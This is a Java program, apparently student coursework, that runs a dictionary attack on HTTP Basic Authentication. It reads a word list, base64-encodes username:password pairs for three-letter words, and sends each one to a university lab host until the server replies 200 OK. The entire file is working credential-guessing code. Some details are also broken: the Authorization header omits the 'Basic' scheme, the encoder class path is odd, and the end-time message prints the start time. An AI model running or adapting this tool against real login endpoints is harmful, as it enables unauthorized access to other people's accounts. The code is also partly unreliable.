
import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.util.*;
import java.net.*;

public class Dictionary
{
   private String userPassword;
   private static int counter;





   public Dictionary(String username)
   {
    String user;
    String password;
    counter = 0;
    user = username;

          try
          {
            FileReader fr = new FileReader( "/usr/share/lib/dict/words" );
            BufferedReader bf = new BufferedReader( fr );

              while ((password = bf.readLine()) != null)
              {
                  userPassword = user + ":" + password;

                   System.out.print(".");

                     if (password.length() == 3)
                         if (doEncoding(userPassword)== true)
                         {
                            System.out.println(password);
                            return;
                        }

                  counter++;
               }
          }
          catch ( IOException ioe )
          {
            System.err.println( ioe.toString() );
          }
   }




   private boolean doEncoding(String userPassword)
   {
       String encoding = new misc.BASE64Encoder().encode (userPassword.getBytes());
       return doAttempt(encoding);
   }





   private boolean doAttempt (String encoding)
   {

      try
      {
         URL url = new URL ("http://sec-crack.cs.rmit.edu./SEC/2/");

         URLConnection uc = url.openConnection();
         uc.setDoInput(true);
         uc.setDoOutput(true);

         uc.setRequestProperty  ("Get", "/SEC/2/ " + "HTTP/1.1");
         uc.setRequestProperty  ("Host", "sec-crack.cs.rmit.edu.");
         uc.setRequestProperty  ("Authorization", " " + encoding);

         return uc.getHeaderField(0).trim().equalsIgnoreCase("HTTP/1.1 200 OK");
       }
       catch (MalformedURLException e)
       {
         System.out.println ("Invalid URL");
       }
       catch (IOException e)
       {
         System.out.println (e.toString() );
       }

       return false;
   }





  public static void  main(String args[])
   {
     Date sdate = new Date();
     System.out.print("Starting the Ditionary Attack at:" + sdate + "\n");

     Dictionary bf = new Dictionary(args[0]);

     Date edate = new Date();
     System.out.print("Ditionary Attack ends at:" + sdate + "\n");
     System.out.println("Time taken by Dictionary is : " + (edate.getTime() - sdate.getTime())/1000 + " seconds \n");
     System.out.print("Attempts  in this session:" + counter + "\n");

   }
}




